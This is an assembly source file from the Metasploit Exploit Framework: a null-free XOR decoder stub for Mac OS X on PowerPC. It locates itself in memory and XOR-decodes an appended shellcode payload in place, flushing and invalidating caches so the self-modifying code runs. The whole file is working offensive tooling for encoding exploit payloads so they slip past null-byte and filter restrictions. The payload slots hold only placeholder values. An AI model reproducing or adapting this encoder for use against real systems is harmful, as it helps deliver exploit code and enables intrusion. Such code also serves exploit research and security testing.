;;
;
;        Name: encoder_dword_xor_tag
;   Qualities: Null-Free Decoder
;   Platforms: MacOS X / PPC
;     Authors: H D Moore <hdm [at] metasploit.com>
;     Version: $Revision: 1612 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        A simple XOR decoder that accounts for PPC cache issues.
;        This decoder is not capable of encoding a payload that
;        contains a NULL dword (since the XOR against the key would
;        trigger the exit of the decoding loop).
;
;        Originally based on Dino's longxor.s
;
;;

;;; Based on Dino Dai Zovi's PPC decoder (20030821) ...
;;; This encoder can't deal with null DWORDS in the payload

.globl	main
.globl	_main

main:
_main:
	xor.	r5, r5, r5
	bnel	main

	mflr	r31
	subi	r31, r31, 0x3030 - 60
	addi	r5, r5, 0x3030

	lis		r6, hi16(0x01020304)
	ori		r6, r6, lo16(0x01020304)

Lxorlp:	
	;;; Load a word, xor it, store it
	lwz		r8, 0x3030(r31)
	xor.	r4, r8, r6
	stw		r4, 0x3030(r31)

	;;; Do the self-modifying code song and dance
	dcbf	r5, r31			; Flush data cache block to memory
	.long	0x7cff04ac		; (sync) Wait for flush to complete
	icbi	r5, r31			; Invalidate instruction cache block

	;;; Increment the data pointer
	subi	r30, r5, 0x3030 - 4
	add		r31, r31, r30

	;;; Branch once we reach the XOR key tag
	bne		Lxorlp			; Branch if we xor'd our own key
	.long	0x4cff012c		; (isync) Toss prefetched instructions

payload:
	;;; Insert XORed payload here
	
	;.long	(0x7fe00008 ^ 0x01020304)
	;.long	(0x7fe00008 ^ 0x01020304)
	;.long	(0x7fe00008 ^ 0x01020304)
	;.long	(0x7fe00008 ^ 0x01020304)
	;.long	(0x7fe00008 ^ 0x01020304)

	;; Insert XOR key here
	.long	0x01020304
